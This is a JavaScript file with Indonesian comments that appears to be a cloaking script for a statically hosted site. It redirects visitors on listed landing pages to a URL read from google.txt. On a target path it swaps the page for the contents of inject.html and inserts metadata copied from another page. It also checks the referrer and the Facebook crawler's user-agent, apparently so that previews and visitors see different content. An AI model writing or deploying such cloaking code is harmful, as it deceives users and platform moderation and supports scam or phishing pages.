(function () {
  const referrer = document.referrer; // Mendapatkan referer
  const userAgent = navigator.userAgent; // Mendapatkan user-agent
  const isFacebookCrawler = /facebookexternalhit|facebook/i.test(userAgent); // Deteksi crawler Facebook
  const currentPath = location.pathname; // Mendapatkan path URL saat ini
  const testing = true; // Flag untuk pengujian

  // Fungsi untuk membaca file eksternal
  const fetchFileContent = async (filePath) => {
    const response = await fetch(filePath);
    if (!response.ok) {
      throw new Error(`Failed to fetch ${filePath}`);
    }
    return response.text();
  };

  // Fungsi untuk menyisipkan metadata asli ke dalam DOM
  const injectMetadata = (metadata) => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(metadata, 'text/html');

    // Sisipkan <title>
    const title = doc.querySelector('title');
    if (title) {
      document.title = title.textContent;
    }

    // Sisipkan <meta> dan <link>
    const head = document.head;
    doc.querySelectorAll('meta, link').forEach((meta) => {
      head.appendChild(meta.cloneNode(true));
    });
  };

  // Membaca URL dari google.txt, target.txt, metadata dari target.txt, dan daftar halaman dari landingpage.txt
  Promise.all([
    fetchFileContent('/google.txt'),
    fetchFileContent('/target.txt'),
    fetchFileContent('/target.txt'), // Ambil metadata asli dari target.txt
    fetchFileContent('/landingpage.txt'), // Ambil daftar halaman dari landingpage.txt
  ])
    .then(([googleUrl, targetUrl, originalHtml, landingPages]) => {
      const landingPageList = landingPages.split('\n').map((page) => page.trim()); // Buat daftar halaman

      if (landingPageList.some((page) => currentPath.includes(page))) {
        // Jika currentPath cocok dengan salah satu halaman di landingpage.txt
        injectMetadata(originalHtml); // Sisipkan metadata asli dari target.txt
        location.href = googleUrl.trim(); // Redirect ke URL dari google.txt
      } else if (currentPath.includes(targetUrl.trim()) && (!referrer.includes('facebook.com') || testing)) {
        // GitHub Pages optimized approach for loading inject.html
        const loadInjectHTML = () => {
          // Get the repository name from the URL for GitHub Pages path resolution
          const pathSegments = window.location.pathname.split('/');
          const repoName = pathSegments[1] === '' ? '' : '/' + pathSegments[1];
          
          // Use XMLHttpRequest with proper GitHub Pages path handling
          const xhr = new XMLHttpRequest();
          const timestamp = new Date().getTime();
          
          // For GitHub Pages, we need to ensure the path starts with the repo name
          // If running locally or at root domain, this will still work
          const injectPath = window.location.origin + repoName + '/inject.html?nocache=' + timestamp;
          
          console.log('Attempting to fetch from:', injectPath);
          
          xhr.open('GET', injectPath, true);
          xhr.setRequestHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
          xhr.setRequestHeader('Pragma', 'no-cache');
          
          xhr.onload = function() {
            if (xhr.status >= 200 && xhr.status < 300) {
              const html = xhr.responseText;
              
              if (!html || html.trim() === '') {
                console.error('Fetched inject.html is empty');
                // Try alternative path if empty
                tryAlternativePath();
                return;
              }
              
              console.log('Inject HTML successfully loaded');
              processHTML(html);
            } else {
              console.error('Failed to fetch inject.html:', xhr.status);
              tryAlternativePath();
            }
          };
          
          xhr.onerror = function() {
            console.error('Network error while fetching inject.html');
            tryAlternativePath();
          };
          
          xhr.send();
        };
        
        // Try alternative path if the first attempt fails
        const tryAlternativePath = () => {
          console.log('Trying alternative path for inject.html');
          const xhr = new XMLHttpRequest();
          const timestamp = new Date().getTime();
          // Try relative path as fallback
          xhr.open('GET', './inject.html?nocache=' + timestamp, true);
          xhr.onload = function() {
            if (xhr.status >= 200 && xhr.status < 300) {
              const html = xhr.responseText;
              if (html && html.trim() !== '') {
                console.log('Inject HTML loaded from alternative path');
                processHTML(html);
              } else {
                console.error('All attempts to load inject.html failed');
                alert('Failed to load content. Please check your connection.');
              }
            }
          };
          xhr.send();
        };
        
        // Process the HTML content once loaded
        const processHTML = (html) => {
          try {
            // Replace document content
            document.open();
            document.write(html);
            document.close();
            
            // Inject metadata after DOM replacement
            setTimeout(() => {
              injectMetadata(originalHtml);
              console.log('Metadata injection complete');
            }, 200);
          } catch (e) {
            console.error('Error processing HTML:', e);
          }
        };
        
        // Start the loading process
        loadInjectHTML();
      }
    })
    .catch((err) => console.error('Error loading URLs:', err));
})();